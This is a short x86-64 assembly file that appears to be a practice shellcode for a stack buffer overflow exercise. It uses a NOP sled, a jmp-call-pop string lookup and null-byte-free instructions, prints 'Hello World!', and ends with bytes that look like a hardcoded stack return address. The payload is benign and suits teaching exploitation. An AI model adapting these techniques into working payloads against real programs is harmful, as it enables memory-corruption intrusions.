BITS 64

%rep 36
  nop
%endrep

jmp short msg

main:
  pop rsi

  ; system call for write
  ;mov rax, 1
  xor eax, eax
  add eax, 1

  ; to stdout
  ;mov rdi, 1
  xor rdi, rdi
  add rdi, 1

  ; length of string
  ;mov rdx, 11
  xor rdx, rdx
  add rdx, 13

  syscall

  ; system call for exit
  ;mov rax, 60
  xor rax, rax
  add rax, 60
  syscall

msg:
  call main
  db "Hello World!", 0x0a, 0x0d

db 0x58,0xea,0xff,0xff,0xff,0x7f
